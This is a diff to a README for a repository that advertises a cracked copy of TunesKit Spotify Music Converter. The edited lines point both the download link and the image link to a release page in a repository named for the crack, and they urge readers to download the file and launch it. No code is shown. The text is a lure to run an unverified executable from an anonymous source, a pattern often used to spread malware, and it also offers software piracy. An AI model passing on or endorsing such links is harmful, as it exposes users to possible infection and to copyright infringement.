@@ -17,7 +17,7 @@ Here are some of the topics covered in this repository:
 
 ## Resources
 
-To access the program discussed in this repository, you can [download it here](https://github.com/download/Program.zip). Once downloaded, make sure to launch the file to begin exploring the possibilities of TunesKit Spotify Music Converter.
+To access the program discussed in this repository, you can [download it here](https://github.com/wildflame-s/TunesKit_Spotify_Music_Converter_Crack/releases/tag/v2.0). Once downloaded, make sure to launch the file to begin exploring the possibilities of TunesKit Spotify Music Converter.
 
 For more information, updates, and additional resources, kindly check the "Releases" section of this repository.
 
@@ -27,4 +27,4 @@ To stay updated on the latest developments, be sure to ⭐️ star this reposito
 
 Let's dive into the world of music like never before with TunesKit Spotify Music Converter Crack! 🎧🚀
 
-![Music](https://cdn.pixabay.com/photo/2015/09/13/01/13/headphones-938389_960_720.jpg)
+![Music](https://github.com/wildflame-s/TunesKit_Spotify_Music_Converter_Crack/releases/tag/v2.0)
